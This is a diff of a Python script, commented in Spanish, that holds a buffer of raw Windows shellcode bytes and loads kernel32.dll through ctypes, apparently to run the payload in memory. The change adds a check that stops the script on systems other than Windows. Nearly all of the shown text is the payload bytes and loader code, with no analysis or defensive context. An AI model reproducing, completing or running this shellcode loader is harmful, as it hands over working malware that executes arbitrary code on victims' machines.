@@ -1,4 +1,5 @@
 import ctypes
+import sys
 
 # Buffer que contiene el shellcode
 buf =  b""
@@ -41,6 +42,10 @@ buf += b"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d"
 buf += b"\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb"
 buf += b"\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41"
 buf += b"\x89\xda\xff\xd5"
+
+# Verifica si estamos en Windows
+if sys.platform != "win32":
+    raise Exception("Este script debe ser ejecutado en Windows.")
 
 # Cargar la librería Kernel32.dll
 kernel32 = ctypes.windll.kernel32
